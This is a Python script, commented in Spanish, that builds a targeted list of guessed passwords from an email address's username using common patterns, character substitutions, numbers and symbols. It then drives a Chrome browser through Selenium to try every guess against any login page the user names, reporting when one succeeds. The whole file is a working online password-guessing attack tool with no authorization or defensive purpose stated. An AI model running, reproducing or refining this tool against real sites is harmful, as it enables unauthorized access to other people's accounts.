import time
import os
import re
from selenium import webdriver
from selenium.webdriver.common.by import By


def generar_posibles_contrasenas(correo):
    """Genera una lista de contraseñas más certeras basadas en patrones comunes."""
    
    
    nombre_usuario = correo.split("@")[0].replace(" ", "")

    
    palabras_comunes = [
        nombre_usuario, nombre_usuario.capitalize(), nombre_usuario.lower(), nombre_usuario.upper(),
        nombre_usuario + "123", nombre_usuario + "2024", nombre_usuario + "!", nombre_usuario + "$", 
        nombre_usuario + "@", nombre_usuario + "789", "Password123", "Qwerty2024", "Admin!", 
        "Welcome1", "P@ssw0rd", "Hola123", "Test2023", "12345678", "Admin2024"
    ]

    
    sustituciones = {
        "o": "0",
        "a": "@",
        "s": "$",
        "i": "1",
        "e": "3"
    }
    
    def sustituir_letras(palabra):
        for letra, reemplazo in sustituciones.items():
            palabra = palabra.replace(letra, reemplazo)
        return palabra

    
    palabras_comunes.extend([sustituir_letras(palabra) for palabra in palabras_comunes])

    
    numeros = ["123", "456", "789", "2024", "1", "2", "3", "0"]
    caracteres_especiales = ["!", "@", "#", "$", "%", "&", "*", "-", "_", "+", "="]

    posibles_contrasenas = set()

    
    for palabra in palabras_comunes:
        for numero in numeros:
            for caracter in caracteres_especiales:
                contrasena = palabra + numero + caracter
                posibles_contrasenas.add(contrasena)

    
    return sorted(posibles_contrasenas, key=lambda x: x[0].isalpha(), reverse=True)


def guardar_contrasenas(correo, contrasenas):
    """Guarda las contraseñas generadas en un archivo de texto."""
    archivo_salida = "contrasenas_generadas.txt"
    
    with open(archivo_salida, "w") as archivo:
        archivo.write(f"Correo: {correo}\n")
        archivo.write("\nContraseñas generadas:\n")
        for contrasena in contrasenas:
            archivo.write(contrasena + "\n")
    
    print(f"Las contraseñas han sido guardadas en {archivo_salida}")


def esperar_ingreso_correo(driver):
    """Espera hasta que el usuario ingrese un correo completo con '@' y un dominio válido."""
    try:
        campo_email = driver.find_element(By.XPATH, "//input[@type='email' or @name='email' or contains(@id, 'email')]")

        print("Por favor, ingresa tu correo en el formulario de la página. El script esperará hasta que esté completo.")

        while True:
            correo_actual = campo_email.get_attribute("value")

            # Verificar si el correo ingresado es válido (contiene @ y un dominio común)
            if correo_actual and re.match(r"^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$", correo_actual):
                print(f"Correo ingresado detectado: {correo_actual}")
                time.sleep(2)  # Espera pequeña adicional para estabilidad
                return correo_actual

            time.sleep(1)  # Revisar cada segundo si el usuario terminó de escribir

    except Exception as e:
        print(f"Error al esperar el correo: {e}")
        return None


def probar_login(driver, correo, contrasenas):
    """Automatiza el intento de login en la página con diferentes contraseñas."""
    try:
        campo_email = driver.find_element(By.XPATH, "//input[@type='email' or @name='email' or contains(@id, 'email')]")
        campo_password = driver.find_element(By.XPATH, "//input[@type='password']")
        boton_login = driver.find_element(By.XPATH, "//button[@type='submit' or contains(text(), 'Login') or contains(text(), 'Ingresar')]")

        for contrasena in contrasenas:
            print(f"Probando contraseña: {contrasena}")

            campo_email.clear()
            campo_email.send_keys(correo)
            campo_password.clear()
            campo_password.send_keys(contrasena)
            boton_login.click()

            time.sleep(2)  # Esperar la respuesta de la página

            
            if "dashboard" in driver.current_url or "home" in driver.current_url:
                print(f"¡Contraseña encontrada!: {contrasena}")
                driver.quit()
                return

        print("No se encontró la contraseña correcta.")
        driver.quit()
    except Exception as e:
        print(f"Error en la prueba de login: {e}")
        driver.quit()


if __name__ == "__main__":
    url_login = input("Digite el link de la página: ").strip()
    
    print(f"Accediendo a la página: {url_login}")
    driver = webdriver.Chrome()
    driver.get(url_login)

    correo = esperar_ingreso_correo(driver)

    if correo:
        contrasenas_generadas = generar_posibles_contrasenas(correo)
        guardar_contrasenas(correo, contrasenas_generadas)
        probar_login(driver, correo, contrasenas_generadas)
    else:
        print("No se pudo obtener un correo válido para generar contraseñas.")
        driver.quit()


